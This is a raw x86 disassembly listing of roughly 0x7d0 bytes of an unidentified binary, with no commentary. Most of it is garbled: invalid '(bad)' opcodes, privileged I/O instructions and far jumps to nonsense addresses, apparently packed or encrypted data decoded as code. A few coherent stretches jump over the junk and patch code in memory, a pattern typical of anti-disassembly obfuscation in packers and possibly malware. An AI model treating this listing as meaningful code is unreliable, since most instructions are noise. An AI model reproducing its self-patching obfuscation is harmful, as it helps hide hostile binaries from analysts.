  406be6:	inc    ebx
  406be7:	cdq    
  406be8:	inc    ebp
  406be9:	stc    
  406bea:	pop    eax
  406beb:	and    dl,al
  406bed:	pop    ebp
  406bee:	mov    dh,0x7f
  406bf0:	adc    eax,0xed195d24
  406bf5:	sub    ecx,0x68
  406bf8:	sahf   
  406bf9:	cs loop 0x406c17
  406bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bfd:	inc    esp
  406bfe:	xlat   BYTE PTR ds:[ebx]
  406bff:	push   0xfffffff0
  406c01:	sahf   
  406c02:	or     DWORD PTR [esi-0xc9d129d],edi
  406c08:	repz sbb al,BYTE PTR [edx-0x6b]
  406c0c:	sub    DWORD PTR [edx-0x57],edx
  406c0f:	jecxz  0x406c22
  406c11:	cmp    al,0xde
  406c13:	ja     0x406bd9
  406c15:	in     al,0x17
  406c17:	rcr    DWORD PTR [esi+0x4e],cl
  406c1a:	(bad)  
  406c1b:	sub    edx,DWORD PTR [ebx-0x8a2f83f]
  406c21:	and    al,0xae
  406c23:	outs   dx,DWORD PTR ds:[esi]
  406c24:	inc    esi
  406c25:	mov    al,0xe1
  406c27:	in     al,0x5a
  406c29:	xchg   al,dh
  406c2b:	add    DWORD PTR [ebx+0x7d2d2ae],edi
  406c31:	popa   
  406c32:	outs   dx,BYTE PTR ds:[esi]
  406c33:	push   0xfffffff7
  406c35:	pop    ebx
  406c36:	dec    ebx
  406c37:	test   DWORD PTR [esi+0x7d],edx
  406c3a:	das    
  406c3b:	jmp    0x406c21
  406c3d:	mov    bl,0x98
  406c3f:	ret    
  406c40:	popf   
  406c41:	push   ecx
  406c42:	rol    DWORD PTR [edx+0x74],cl
  406c45:	addr16 mov ebx,ecx
  406c48:	ret    
  406c49:	out    0xe0,al
  406c4b:	out    dx,eax
  406c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c4d:	adc    ch,BYTE PTR [ecx-0x38]
  406c50:	retf   
  406c51:	lea    esp,[ecx+0x29bb25c8]
  406c57:	mov    WORD PTR [edx],?
  406c59:	jo     0x406c9e
  406c5b:	imul   eax,DWORD PTR [ebx+eax*4],0xffffffb8
  406c5f:	and    al,0xea
  406c61:	add    BYTE PTR [edi],bl
  406c63:	fldcw  WORD PTR [eax+0x1e]
  406c66:	out    0xe8,eax
  406c68:	mov    ds:0x15fc0a63,al
  406c6d:	loope  0x406c80
  406c6f:	fcom   DWORD PTR [esi+0x6fe8d741]
  406c75:	dec    esi
  406c76:	std    
  406c77:	cmp    DWORD PTR [eax],ecx
  406c79:	sub    eax,0x2261d101
  406c7e:	retf   0xab17
  406c81:	add    BYTE PTR [ebx+0x3151c953],ah
  406c87:	xor    bh,BYTE PTR [edx+0x56e5ad95]
  406c8d:	stos   BYTE PTR es:[edi],al
  406c8e:	xchg   ebp,eax
  406c8f:	xchg   BYTE PTR [edx-0x78],cl
  406c92:	fwait
  406c93:	mul    BYTE PTR es:[edi]
  406c96:	push   ebx
  406c97:	cmp    eax,0x9e46b90e
  406c9c:	loopne 0x406cbf
  406c9e:	loopne 0x406cda
  406ca0:	or     al,0x2e
  406ca2:	mov    bl,0x80
  406ca4:	not    BYTE PTR [ebx+edx*8]
  406ca7:	pusha  
  406ca8:	fsubr  DWORD PTR [edx]
  406caa:	jmp    0x8f50:0x8181a43d
  406cb1:	ja     0x406d02
  406cb3:	fldcw  WORD PTR [edx+0x2fd95b39]
  406cb9:	clc    
  406cba:	mov    eax,ds:0x92ced02b
  406cbf:	cdq    
  406cc0:	pop    esp
  406cc1:	jo     0x406d18
  406cc3:	sbb    eax,0xd7932760
  406cc8:	pop    ss
  406cc9:	dec    eax
  406cca:	push   cs
  406ccb:	push   DWORD PTR [ebp-0xc]
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0x4525d985
  406cf4:	dec    ebx
  406cf5:	scas   eax,DWORD PTR es:[edi]
  406cf6:	retf   
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406cf7
  406cff:	lock jae 0x406d42
  406d02:	inc    ebp
  406d03:	push   eax
  406d04:	loop   0x406d5a
  406d06:	xchg   ebx,eax
  406d07:	repnz cld 
  406d09:	jno    0x406d24
  406d0b:	xchg   esi,eax
  406d0c:	loopne 0x406cc6
  406d0e:	xchg   ebp,eax
  406d0f:	xchg   edx,eax
  406d10:	loop   0x406c95
  406d12:	mov    ah,0xf9
  406d14:	rol    BYTE PTR [edx+ebp*8+0x25],1
  406d18:	dec    edx
  406d19:	pushf  
  406d1a:	push   0xa
  406d1c:	call   FWORD PTR [ecx]
  406d1e:	scas   eax,DWORD PTR es:[edi]
  406d1f:	mov    esi,0x7879a6bb
  406d24:	push   ds
  406d25:	jecxz  0x406cc7
  406d27:	or     DWORD PTR [edi],esp
  406d29:	dec    edi
  406d2a:	cld    
  406d2b:	bound  esi,QWORD PTR [edi+eax*4+0x35731320]
  406d32:	xchg   ebp,eax
  406d33:	jo     0x406d1e
  406d35:	mov    dh,0xa6
  406d37:	and    ebp,DWORD PTR [esi-0x7e4603be]
  406d3d:	and    DWORD PTR [esp+ebx*4-0x56],ebp
  406d41:	push   ss
  406d42:	xor    bl,bl
  406d44:	mov    ebp,edx
  406d46:	scas   al,BYTE PTR es:[edi]
  406d47:	test   eax,0x3e52581c
  406d4c:	jmp    0x406cda
  406d4e:	mov    edi,0x361c908d
  406d53:	mov    al,ds:0xb5518974
  406d58:	xor    al,0x4b
  406d5a:	inc    esi
  406d5b:	mov    BYTE PTR [edi+0x6761e8da],cl
  406d61:	dec    edx
  406d62:	fcomp  QWORD PTR [edx]
  406d64:	cmp    BYTE PTR [esi],dh
  406d66:	push   ds
  406d67:	in     al,0xd4
  406d69:	cmp    BYTE PTR [edi+0x27],dl
  406d6c:	hlt    
  406d6d:	arpl   WORD PTR [ecx+0x1a3bbd2],bx
  406d73:	push   es
  406d74:	test   BYTE PTR [edx-0xe],0x27
  406d78:	xchg   esi,eax
  406d79:	loop   0x406d03
  406d7b:	push   ebp
  406d7c:	fsubr  st,st(5)
  406d7e:	xor    al,0xf6
  406d80:	pop    esp
  406d81:	cmp    BYTE PTR [ebx+0x3bc95271],dh
  406d87:	pop    ss
  406d88:	mov    ebp,DWORD PTR [ebx+0x42]
  406d8b:	dec    edi
  406d8c:	jno    0x406de0
  406d8e:	mov    edx,0x66deb66d
  406d93:	lods   al,BYTE PTR ds:[esi]
  406d94:	cli    
  406d95:	in     eax,0x5e
  406d97:	sar    DWORD PTR [edi+0x47],1
  406d9a:	pusha  
  406d9b:	pop    ss
  406d9c:	inc    eax
  406d9d:	mov    ebp,0x90c7a15
  406da2:	fs ret 0xfb38
  406da6:	jns    0x406d70
  406da8:	inc    eax
  406da9:	std    
  406daa:	sub    al,BYTE PTR [eax-0x4c2095af]
  406db0:	fcomp  DWORD PTR [esi+0x0]
  406db3:	mov    esp,0x26efe53c
  406db8:	sti    
  406db9:	sub    dh,dh
  406dbb:	push   0x28
  406dbd:	pop    eax
  406dbe:	xlat   BYTE PTR ds:[ebx]
  406dbf:	mov    eax,ds:0xcf22d620
  406dc4:	scas   eax,DWORD PTR es:[edi]
  406dc5:	addr16 jnp 0x406deb
  406dc8:	jecxz  0x406e19
  406dca:	sti    
  406dcb:	xor    bl,ah
  406dcd:	xchg   edx,eax
  406dce:	and    ebx,DWORD PTR [esi+0x7fdd1989]
  406dd4:	jnp    0x406de9
  406dd6:	mov    edi,0x108081d1
  406ddb:	push   0xffffff97
  406ddd:	mov    eax,ds:0x6a9f70bb
  406de2:	jbe    0x406e54
  406de4:	xor    BYTE PTR [ebx],0xf7
  406de7:	sti    
  406de8:	push   esp
  406de9:	dec    ebp
  406dea:	jp     0x406dbf
  406dec:	cmp    BYTE PTR [esi-0x1be1d550],bl
  406df2:	jge    0x406d94
  406df4:	add    esi,DWORD PTR [eax-0x31]
  406df7:	sahf   
  406df8:	jae    0x406dad
  406dfa:	ja     0x406dab
  406dfc:	sbb    al,0xff
  406dfe:	dec    esi
  406dff:	add    BYTE PTR [ebp-0x1efea3b8],ch
  406e05:	xlat   BYTE PTR ds:[ebx]
  406e06:	xlat   BYTE PTR ds:[ebx]
  406e07:	in     eax,0xf6
  406e09:	and    ebp,DWORD PTR [ecx-0x43]
  406e0c:	shl    DWORD PTR [edx+0x111c7829],0xb9
  406e13:	add    edi,edx
  406e15:	iret   
  406e16:	(bad)  
  406e17:	mov    bl,0x16
  406e19:	hlt    
  406e1a:	loopne 0x406da0
  406e1c:	sar    dh,cl
  406e1e:	xchg   ebp,eax
  406e1f:	les    ecx,FWORD PTR ds:[eax+edx*8]
  406e23:	stos   BYTE PTR es:[edi],al
  406e24:	inc    ecx
  406e25:	std    
  406e26:	jns    0x406df5
  406e28:	mov    ah,0xcf
  406e2a:	mov    ds:0xf45641ba,eax
  406e2f:	mov    ds:0xda4de537,al
  406e34:	imul   edi,DWORD PTR [ebp+0x54222270],0x64bdb087
  406e3e:	xor    al,0x5f
  406e40:	or     esi,ebx
  406e42:	pop    es
  406e43:	jmp    0x5020234
  406e48:	xchg   dl,dh
  406e4a:	test   BYTE PTR [edx+ebx*2-0x6c],cl
  406e4e:	sbb    bh,BYTE PTR [edx-0x55]
  406e51:	sub    eax,0x9adb1013
  406e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e57:	adc    DWORD PTR [eax],0x6f
  406e5a:	push   esi
  406e5b:	cld    
  406e5c:	aaa    
  406e5d:	ret    
  406e5e:	xor    DWORD PTR [eax-0xf],edi
  406e61:	or     BYTE PTR [eax-0x7a],al
  406e64:	push   edx
  406e65:	push   ds
  406e66:	xchg   DWORD PTR [ebp-0x43],esi
  406e69:	jns    0x406df3
  406e6b:	mov    WORD PTR [ecx+ebx*8],ds
  406e6e:	pop    ds
  406e6f:	fsubr  DWORD PTR [ebx]
  406e71:	cld    
  406e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e73:	inc    ecx
  406e74:	push   eax
  406e75:	or     BYTE PTR [ecx],cl
  406e77:	test   BYTE PTR ss:[ebx],dl
  406e7a:	push   ebx
  406e7b:	stc    
  406e7c:	push   ecx
  406e7d:	call   0x4998:0xc3f766cb
  406e84:	(bad)
  406e88:	add    al,0xd6
  406e8a:	out    dx,al
  406e8b:	add    DWORD PTR [ebx-0x6269a358],edx
  406e91:	xor    ecx,DWORD PTR [ecx-0xf]
  406e94:	imul   DWORD PTR [ecx]
  406e96:	dec    ebp
  406e97:	xchg   edi,eax
  406e98:	(bad)  
  406e99:	in     al,dx
  406e9a:	lods   eax,DWORD PTR ds:[esi]
  406e9b:	cmp    ecx,DWORD PTR [edx+0xd]
  406e9e:	iret   
  406e9f:	out    0x15,eax
  406ea1:	mov    edi,edx
  406ea3:	cmp    eax,0xd24658cb
  406ea8:	lahf   
  406ea9:	cmp    al,0x37
  406eab:	inc    edx
  406eac:	push   0x15
  406eae:	(bad)  
  406eaf:	jmp    0x406ed5
  406eb1:	xor    ah,ch
  406eb3:	aad    0x40
  406eb5:	or     dl,cl
  406eb7:	iret   
  406eb8:	dec    esp
  406eb9:	enter  0x1f6a,0xef
  406ebd:	ds retf 
  406ebf:	int    0x44
  406ec1:	mov    dl,0xd8
  406ec3:	mov    ds:0xd9293efb,eax
  406ec8:	scas   eax,DWORD PTR es:[edi]
  406ec9:	adc    dh,BYTE PTR [ebx]
  406ecb:	push   esi
  406ecc:	jle    0x406ead
  406ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ecf:	fldenv [ebp+0x2fefb8f5]
  406ed5:	stos   DWORD PTR es:[edi],eax
  406ed6:	call   0xc287:0x3f6969a
  406edd:	sub    dl,BYTE PTR ds:0x607ec33e
  406ee3:	ret    0x15fb
  406ee6:	jo     0x406e84
  406ee8:	nop
  406ee9:	cs mov ebp,0xb125c10d
  406eef:	icebp  
  406ef0:	push   0x2d0228ce
  406ef5:	mov    al,0x39
  406ef7:	push   edi
  406ef8:	push   edx
  406ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406efa:	jge    0x406ea1
  406efc:	inc    eax
  406efd:	out    0xf1,al
  406eff:	jge    0x406f03
  406f01:	imul   ecx
  406f03:	leave  
  406f04:	adc    ecx,eax
  406f06:	into   
  406f07:	int3   
  406f08:	repnz bound ecx,QWORD PTR [eax-0x348708b6]
  406f0f:	add    ebp,DWORD PTR [esi-0xa879ea6]
  406f15:	(bad)  
  406f16:	aas    
  406f17:	and    ebx,DWORD PTR [esp+ebp*1-0xadcaa36]
  406f1e:	add    al,0xa8
  406f20:	push   edx
  406f21:	fidiv  DWORD PTR [eax]
  406f23:	xor    ebx,DWORD PTR [eax+esi*4+0x7]
  406f27:	retf   0x706b
  406f2a:	pop    ebx
  406f2b:	fisubr DWORD PTR [eax+0x1a71a746]
  406f31:	mov    edx,DWORD PTR [ecx+0x4f]
  406f34:	mov    ecx,DWORD PTR [ecx+0x26]
  406f37:	int    0xed
  406f39:	add    cl,BYTE PTR [ecx]
  406f3b:	sub    esi,DWORD PTR [eax-0x71d37d13]
  406f41:	jbe    0x406fc1
  406f43:	jl     0x406f9a
  406f45:	lods   al,BYTE PTR ds:[esi]
  406f46:	aas    
  406f47:	popa   
  406f48:	or     al,bl
  406f4a:	hlt    
  406f4b:	xchg   BYTE PTR [esp+ebx*2+0x6d],ah
  406f4f:	loope  0x406f6f
  406f51:	mov    ebx,DWORD PTR [edx]
  406f53:	xchg   BYTE PTR [edi],al
  406f55:	sbb    bl,BYTE PTR ds:0x30212f0c
  406f5b:	fisttp WORD PTR [ebx+0x3315af48]
  406f61:	std    
  406f62:	adc    edx,DWORD PTR [esi+0x73db83e]
  406f68:	in     eax,0x36
  406f6a:	or     BYTE PTR [ebp-0x76289df7],0xda
  406f71:	frstpm(287 only) 
  406f73:	or     BYTE PTR [ebp-0x57],ch
  406f76:	sub    DWORD PTR [ebx-0x3143fe0e],ecx
  406f7c:	push   edi
  406f7d:	adc    BYTE PTR [esi+0x17177bb3],al
  406f83:	fbstp  TBYTE PTR [ebx-0x6c]
  406f86:	sbb    eax,ebx
  406f88:	mov    bl,0xe7
  406f8a:	inc    ebp
  406f8b:	into   
  406f8c:	bound  eax,QWORD PTR [edi-0x61]
  406f8f:	push   cs
  406f90:	dec    esp
  406f91:	mov    ds:0xa7f17b13,al
  406f96:	add    dl,bl
  406f98:	sbb    BYTE PTR [esi+0x61],dl
  406f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f9c:	or     ah,BYTE PTR [esi+0x6429a14c]
  406fa2:	adc    al,0xab
  406fa4:	or     DWORD PTR [ecx+0x1e],esp
  406fa7:	aad    0xea
  406fa9:	lock cmp ebx,DWORD PTR [ecx]
  406fac:	cld    
  406fad:	out    0xad,eax
  406faf:	dec    ebp
  406fb0:	(bad)  
  406fb1:	nop
  406fb2:	jmp    0x60ca:0xe4ce28ab
  406fb9:	ss (bad) 
  406fbb:	out    0x1e,eax
  406fbd:	not    DWORD PTR [ecx+0x59]
  406fc0:	mov    cl,0xef
  406fc2:	pop    ecx
  406fc3:	mov    cl,0xd9
  406fc5:	adc    bl,BYTE PTR [esi+0x13bd9284]
  406fcb:	sbb    DWORD PTR [eax],ecx
  406fcd:	daa    
  406fce:	pop    ss
  406fcf:	push   esp
  406fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fd1:	adc    esp,ebp
  406fd3:	add    ebx,DWORD PTR [edi-0x7]
  406fd6:	shl    cl,cl
  406fd8:	inc    esp
  406fd9:	push   esi
  406fda:	mov    ebp,0xd5bb90d8
  406fdf:	cdq    
  406fe0:	(bad)  
  406fe1:	cmp    edx,DWORD PTR [eax-0x17]
  406fe4:	data16 arpl WORD PTR [eax*8+0x341e6bdc],dx
  406fec:	fwait
  406fed:	jo     0x407023
  406fef:	out    0x6c,eax
  406ff1:	fisttp WORD PTR [ebp-0x5c]
  406ff4:	sub    dh,ah
  406ff6:	adc    DWORD PTR [esi],edx
  406ff8:	mov    ecx,0x835d27ce
  406ffd:	rcr    DWORD PTR [esp+esi*2-0x7dd66e25],cl
  407004:	push   ss
  407005:	mov    edi,0xfe447128
  40700a:	daa    
  40700b:	jb     0x406fdc
  40700d:	and    BYTE PTR [ecx+ebx*1+0xe04da90],dl
  407014:	push   ebp
  407015:	scas   al,BYTE PTR es:[edi]
  407016:	pop    ds
  407017:	into   
  407018:	adc    eax,0x25498ee0
  40701d:	add    eax,edx
  40701f:	hlt    
  407020:	push   ds
  407021:	xor    eax,0x4f6fc3da
  407026:	cmp    edx,ecx
  407028:	and    DWORD PTR [eax-0x59724822],ecx
  40702e:	push   eax
  40702f:	mov    eax,DWORD PTR [ebp-0x14]
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0x5af25cb6
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x40708d
  407061:	aad    0xd9
  407063:	push   cs
  407064:	mov    al,ds:0xba71f31a
  407069:	adc    BYTE PTR [edi],bh
  40706b:	push   cs
  40706c:	mov    ds:0xcec75168,eax
  407071:	push   esp
  407072:	leave  
  407073:	mov    edx,0x6540422f
  407078:	mov    WORD PTR [ebp-0x4c4e56e6],ss
  40707e:	addr16 pop ebp
  407080:	adc    esp,DWORD PTR ds:0xda51a146
  407086:	mov    ds:0x7750581,al
  40708b:	mov    ax,ds:0xf4207f67
  407091:	ins    DWORD PTR es:[edi],dx
  407092:	cmp    esp,esi
  407094:	cwde   
  407095:	out    0x84,al
  407097:	push   0x6b
  407099:	fwait
  40709a:	xchg   edx,eax
  40709b:	ret    0x6a92
  40709e:	or     al,BYTE PTR [ebx-0x338135f4]
  4070a4:	int3   
  4070a5:	mov    ds:0xc3af56f8,al
  4070aa:	fwait
  4070ab:	gs push esi
  4070ad:	pushf  
  4070ae:	lea    ebp,[ebx]
  4070b0:	mov    al,0xa
  4070b2:	icebp  
  4070b3:	adc    DWORD PTR [esi],edx
  4070b5:	out    0x50,al
  4070b7:	shl    BYTE PTR [edx-0x9],0xd5
  4070bb:	add    eax,0xfffffffc
  4070be:	add    BYTE PTR [esi+0x22f07f3b],cl
  4070c4:	mov    bh,0xa5
  4070c6:	sub    al,BYTE PTR [eax]
  4070c8:	mov    al,ds:0x9f8bb25
  4070cd:	xchg   ebp,eax
  4070ce:	xor    bl,cl
  4070d0:	out    0x41,eax
  4070d2:	in     al,0x5d
  4070d4:	enter  0x40ef,0xde
  4070d8:	inc    ebp
  4070d9:	mov    esp,0x93d4bc72
  4070de:	shl    ah,0xa7
  4070e1:	mov    dl,0xbf
  4070e3:	fmul   QWORD PTR [edx+0x42]
  4070e6:	popa   
  4070e7:	les    ebp,FWORD PTR [ecx-0x42a8252d]
  4070ed:	jno    0x40714d
  4070ef:	add    eax,0xa817823e
  4070f4:	ret    0x2f63
  4070f7:	cld    
  4070f8:	mov    ?,WORD PTR [edx]
  4070fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070fb:	inc    ebp
  4070fc:	adc    BYTE PTR [edi+esi*2-0x4d],bh
  407100:	out    dx,eax
  407101:	xlat   BYTE PTR ds:[ebx]
  407102:	cld    
  407103:	inc    eax
  407104:	and    eax,0xaec4aff1
  407109:	and    ch,BYTE PTR [edi-0xc586937]
  40710f:	fld    QWORD PTR [eax+0x5a]
  407112:	loop   0x407183
  407114:	jmp    0x4070bd
  407116:	push   eax
  407117:	(bad)  
  407118:	mov    WORD PTR ds:0xf48bef28,ss
  40711e:	lahf   
  40711f:	int3   
  407120:	cs cmc 
  407122:	jno    0x407134
  407124:	gs dec esi
  407126:	jb     0x4070b2
  407128:	mov    ecx,0xfc371e53
  40712d:	mov    edi,0x13196fef
  407132:	(bad)  
  407133:	jmp    0x407127
  407135:	in     eax,0x3f
  407137:	push   cs
  407138:	sbb    BYTE PTR [ebp-0x10],dh
  40713b:	cmp    al,0x60
  40713d:	shl    DWORD PTR [ebp+0x4d5749f3],cl
  407143:	test   eax,0xf265b9e1
  407148:	mov    DWORD PTR ds:0x2eb7876,esi
  40714e:	icebp  
  40714f:	(bad)  
  407150:	out    0xd4,eax
  407152:	jbe    0x4071a5
  407154:	frstor [ebx]
  407156:	jge    0x407114
  407158:	ds cmc 
  40715a:	pop    ebp
  40715b:	leave  
  40715c:	aas    
  40715d:	sub    eax,0x28c5b4ea
  407162:	push   esi
  407163:	rol    BYTE PTR [esi-0x5],cl
  407166:	enter  0x1243,0x95
  40716a:	mov    ebp,0xedfb36ca
  40716f:	in     eax,0x17
  407171:	js     0x407158
  407173:	out    0xae,al
  407175:	stos   BYTE PTR es:[edi],al
  407176:	push   edi
  407177:	ins    BYTE PTR es:[edi],dx
  407178:	dec    edi
  407179:	out    dx,eax
  40717a:	test   eax,ebp
  40717c:	mov    cl,0x26
  40717e:	retf   0x801d
  407181:	push   ebp
  407182:	mov    ds:0xd7126ad1,eax
  407187:	addr16 (bad) 
  407189:	fcmovnb st,st(3)
  40718b:	add    al,0x84
  40718d:	dec    edi
  40718e:	push   ss
  40718f:	lahf   
  407190:	aad    0x48
  407192:	add    eax,0x146e2b58
  407197:	jle    0x4071b7
  407199:	dec    esi
  40719a:	fstp   DWORD PTR [edi]
  40719c:	es lahf 
  40719e:	xor    DWORD PTR [edx+0x443247e5],0xffffffee
  4071a5:	xor    eax,0x18a4080e
  4071aa:	jmp    0x76eefa0
  4071af:	sub    al,0x45
  4071b1:	mov    al,0xbc
  4071b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b4:	(bad)  
  4071b5:	das    
  4071b6:	stos   DWORD PTR es:[edi],eax
  4071b7:	pop    ebp
  4071b8:	mov    WORD PTR [ebp+0x1e1dd269],ss
  4071be:	std    
  4071bf:	mov    esi,0xc58f1996
  4071c4:	dec    esp
  4071c5:	fwait
  4071c6:	push   0xbfcfdd86
  4071cb:	push   ecx
  4071cc:	sub    edx,DWORD PTR [esi-0x2079d7d0]
  4071d2:	inc    esp
  4071d3:	js     0x407225
  4071d5:	(bad)  
  4071d6:	into   
  4071d7:	push   eax
  4071d8:	dec    ebx
  4071d9:	sub    edx,DWORD PTR [ecx-0x1650f464]
  4071df:	add    eax,0x6a672205
  4071e4:	out    0xb9,eax
  4071e6:	jbe    0x40718d
  4071e8:	cmp    eax,0x884fcbde
  4071ed:	pop    ebx
  4071ee:	mov    esi,0x22a31e3b
  4071f3:	daa    
  4071f4:	jg     0x407271
  4071f6:	pusha  
  4071f7:	dec    ebx
  4071f8:	or     al,dh
  4071fa:	cmp    al,0xd6
  4071fc:	xchg   ecx,eax
  4071fd:	sub    al,0x10
  4071ff:	cwde   
  407200:	test   al,0x0
  407202:	call   0x9644:0xce3f8629
  407209:	int3   
  40720a:	push   ss
  40720b:	jecxz  0x4071c8
  40720d:	cmp    edi,ecx
  40720f:	(bad)  [esi]
  407211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407212:	or     edi,esp
  407214:	adc    DWORD PTR [ebx+0x7edf315d],0xaeedf5a8
  40721e:	jbe    0x40720b
  407220:	mov    bl,0x7
  407222:	adc    al,BYTE PTR [ebx]
  407224:	cmp    BYTE PTR [edi],dl
  407226:	outs   dx,DWORD PTR ds:[esi]
  407227:	dec    ecx
  407228:	dec    eax
  407229:	fisub  DWORD PTR [eax+0x1251871a]
  40722f:	mov    ah,0x34
  407231:	fwait
  407232:	jle    0x407207
  407234:	add    BYTE PTR [esi+0x2c6c17eb],dh
  40723a:	push   edi
  40723b:	jae    0x4071ee
  40723d:	mov    WORD PTR [edx+0x10],cs
  407240:	push   ecx
  407241:	lods   al,BYTE PTR ds:[esi]
  407242:	sbb    edx,edi
  407244:	(bad)  
  407245:	in     al,0x9e
  407247:	test   eax,0x1b4951f4
  40724c:	dec    esi
  40724d:	das    
  40724e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40724f:	xchg   BYTE PTR [edi],dh
  407251:	jnp    0x40728f
  407253:	ror    DWORD PTR [ecx+0x8bc39cf],cl
  407259:	inc    ecx
  40725a:	push   edi
  40725b:	in     eax,0xad
  40725d:	jp     0x407277
  40725f:	or     eax,0x76e01357
  407264:	das    
  407265:	jg     0x40723b
  407267:	fstp   QWORD PTR [esi-0x79f2c9ff]
  40726d:	out    dx,al
  40726e:	mov    dh,cl
  407270:	mov    BYTE PTR [ebx+0x22],ch
  407273:	push   edi
  407274:	jns    0x407206
  407276:	iret   
  407277:	adc    bl,ch
  407279:	ror    BYTE PTR [edx+0x4451150c],cl
  40727f:	(bad)  
  407280:	jno    0x4072eb
  407282:	jb     0x407239
  407284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407285:	aam    0xd0
  407287:	in     al,0x23
  407289:	push   0x66e7a60f
  40728e:	xor    DWORD PTR [edi+0x655fafc0],ecx
  407294:	sub    BYTE PTR [ecx-0x66],dl
  407297:	xchg   BYTE PTR [eax-0x3749d6da],bl
  40729d:	(bad)
  4072a0:	lahf   
  4072a1:	mov    edx,0x62492c86
  4072a6:	out    0xd6,eax
  4072a8:	or     ch,BYTE PTR [esi+0x12]
  4072ab:	xchg   esp,eax
  4072ac:	rol    BYTE PTR [ebx+eax*2-0x66],0x66
  4072b1:	shl    bl,0x1a
  4072b4:	mov    es:0x3d3c0047,eax
  4072ba:	xor    eax,0x130c8988
  4072bf:	fidiv  DWORD PTR [edx+eax*1]
  4072c2:	mov    dl,BYTE PTR [edx+0x3372983f]
  4072c8:	xchg   DWORD PTR [edx],edi
  4072ca:	ret    0x4f1b
  4072cd:	pop    ebx
  4072ce:	sub    al,0x14
  4072d0:	lds    esi,FWORD PTR [edi+0x3ef5de3c]
  4072d6:	fucom  st(1)
  4072d8:	mov    ecx,0x96220581
  4072dd:	js     0x40727a
  4072df:	imul   ebx,esp,0xffffff8f
  4072e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072e3:	mov    ch,0x0
  4072e5:	je     0x40733e
  4072e7:	retf   
  4072e8:	stos   DWORD PTR es:[edi],eax
  4072e9:	adc    DWORD PTR [ebp+0x3f],eax
  4072ec:	outs   dx,DWORD PTR ds:[esi]
  4072ed:	xchg   ebp,eax
  4072ee:	jmp    0xf347753d
  4072f3:	mov    ax,0x11da
  4072f7:	mov    cs,eax
  4072f9:	aad    0xe8
  4072fb:	cmp    BYTE PTR [eax],cl
  4072fd:	lods   eax,DWORD PTR ds:[esi]
  4072fe:	out    0x20,eax
  407300:	sti    
  407301:	sahf   
  407302:	fist   DWORD PTR [ebx+0x51e4b8b0]
  407308:	pop    esp
  407309:	fld    TBYTE PTR ds:0xb7e494a9
  40730f:	xlat   BYTE PTR ds:[ebx]
  407310:	ins    DWORD PTR es:[edi],dx
  407311:	push   edi
  407312:	int3   
  407313:	dec    esp
  407314:	test   al,0x1e
  407316:	xchg   ecx,eax
  407317:	outs   dx,BYTE PTR ds:[esi]
  407318:	ret    0x1178
  40731b:	test   dh,0x7b
  40731e:	bound  eax,QWORD PTR [esi+0x6d46451]
  407324:	jmp    0x8412f55c
  407329:	or     eax,0x921c158c
  40732e:	rol    BYTE PTR ds:0x66a4660b,0x73
  407335:	std    
  407336:	dec    edx
  407337:	push   0x90b16da5
  40733c:	adc    ah,BYTE PTR [ebp+0x4616d730]
  407342:	lock push 0x12
  407345:	push   0x3a4eea93
  40734a:	loop   0x407397
  40734c:	xchg   BYTE PTR [ebp-0x6c564156],dl
  407352:	or     ebx,ebx
  407354:	data16 and al,0xc6
  407357:	out    0xb1,al
  407359:	mov    dl,0x98
  40735b:	fidiv  WORD PTR ds:0xce8c41ae
  407361:	mov    eax,ds:0x84e356a1
  407366:	mov    WORD PTR [ebx],cs
  407368:	mov    DWORD PTR [ebx-0x2f],eax
  40736b:	rol    BYTE PTR [edi-0x7e],1
  40736e:	test   eax,0x2f131aab
  407373:	sub    al,0xc4
  407375:	jmp    0x1c52:0x47a22ff9
  40737c:	mov    ecx,DWORD PTR [ebp+0x438c25dd]
  407382:	sbb    eax,0x4e32c2f8
  407387:	(bad)  
  407388:	aaa    
  407389:	cmp    al,0x19
  40738b:	in     eax,0xbf
  40738d:	jb     0x4073b3
  40738f:	xchg   BYTE PTR [ebx+0x19880],cl
  407395:	add    bh,bh
  407397:	xor    al,ch
  407399:	fstp   DWORD PTR [eax+eax*1+0x0]
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
